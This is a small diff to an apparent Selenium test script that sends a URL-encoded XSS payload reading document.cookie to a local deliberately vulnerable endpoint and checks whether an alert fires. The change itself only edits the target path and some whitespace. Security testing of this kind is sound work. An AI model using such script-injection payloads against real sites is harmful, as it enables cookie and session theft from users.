@@ -9,7 +9,7 @@ chrome_options.add_argument("--disable-gpu")
 
 driver = webdriver.Chrome(options=chrome_options)
 
-target_url = "http://127.0.0.1:8080/vuln/xss.php"
+target_url = "http://127.0.0.1:8080/vuln/xss/echo"
 payload = "<script>alert(document.cookie);</script>"
 
 encoded_payload = urllib.parse.quote(payload)
@@ -24,8 +24,8 @@ try:
     alert_text = alert.text
     print(alert_text)
     alert.accept()
+
 except Exception as e:
     print("XSS failed:", e)
-
 
 driver.quit()
